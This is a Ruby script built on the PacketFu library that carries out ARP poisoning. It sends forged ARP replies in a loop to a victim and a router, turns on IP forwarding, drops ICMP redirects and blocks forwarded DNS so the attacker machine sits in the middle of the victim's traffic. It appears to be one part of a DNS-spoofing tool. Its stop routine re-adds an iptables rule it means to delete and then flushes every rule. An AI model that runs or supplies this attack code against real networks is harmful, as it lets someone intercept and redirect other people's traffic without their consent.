#!/usr/bin/env ruby

# encoding: ASCII-8BIT
require 'packetfu'
require 'rubygems'
require 'thread'

class ARPSpoof
	def initialize(victim_ip, victim_mac, router_ip, router_mac, 
					iface, attacker_ip, attacker_mac)
			
		spoof = false	
		@interface = iface
		@victim_ip = victim_ip
		@attacker_mac = attacker_mac
		# @config = PacketFu::Utils.whoami?(:iface => iface)
		
		# Construct the target's packet
		@arp_packet_target = PacketFu::ARPPacket.new()
		@arp_packet_target.eth_saddr = 		attacker_mac            
		@arp_packet_target.eth_daddr = 		victim_mac	            
		@arp_packet_target.arp_saddr_mac = 	attacker_mac          
		@arp_packet_target.arp_daddr_mac = 	victim_mac		    
		@arp_packet_target.arp_saddr_ip = 	router_ip         
		@arp_packet_target.arp_daddr_ip = 	@victim_ip         
		@arp_packet_target.arp_opcode = 2                        
		 
		# Construct the router's packet
		@arp_packet_router = PacketFu::ARPPacket.new()
		@arp_packet_router.eth_saddr = 		attacker_mac
		@arp_packet_router.eth_daddr = 		router_mac	
		@arp_packet_router.arp_saddr_mac = 	attacker_mac   
		@arp_packet_router.arp_daddr_mac = 	router_mac   
		@arp_packet_router.arp_saddr_ip = 	@victim_ip         
		@arp_packet_router.arp_daddr_ip = 	router_ip	        
		@arp_packet_router.arp_opcode = 2
		
		# Start spoofing if start is true
		if spoof then
			puts "Starting ARP Poisoning..."
			start
		end # if             
	end

	def start
		# Send out both packets
		puts "ARP Poisoning..."
		if @running then
		    puts "Another instance of ARP Poisoning is running..."
		    return
		end
		@running = true

		# Enable IP forwarding
		`echo 1 > /proc/sys/net/ipv4/ip_forward`

		# Prevent ICMP Redirect from coming out of attacker's machine
        `iptables -A OUTPUT -p ICMP --icmp-type 3 -j DROP`
        `iptables -A OUTPUT -p ICMP --icmp-type 5 -d #{@victim_ip} -j DROP`

		# Deny all other DNS requests
		`iptables -A FORWARD -p udp --dport 53 -j DROP`
		`iptables -A FORWARD -p tcp --dport 53 -j DROP`

		while (@running)
			sleep 1
			@arp_packet_target.to_w(@interface)
			@arp_packet_router.to_w(@interface)
		end
	end

	def stop
		@running = false
		
		# Disable Forwarding
		`echo 0 > /proc/sys/net/ipv4/ip_forward`
		
		# Delete rule
		`iptables -D OUTPUT -p ICMP --icmp-type 3 -j DROP`
		`iptables -A OUTPUT -p ICMP --icmp-type 5 -d #{@victim_ip} -j DROP`

		# Deny all other DNS requests
		`iptables -D FORWARD -p udp --dport 53 -j DROP`
		`iptables -D FORWARD -p tcp --dport 53 -j DROP`
		
    	`iptables -F`
    	end # stop
end
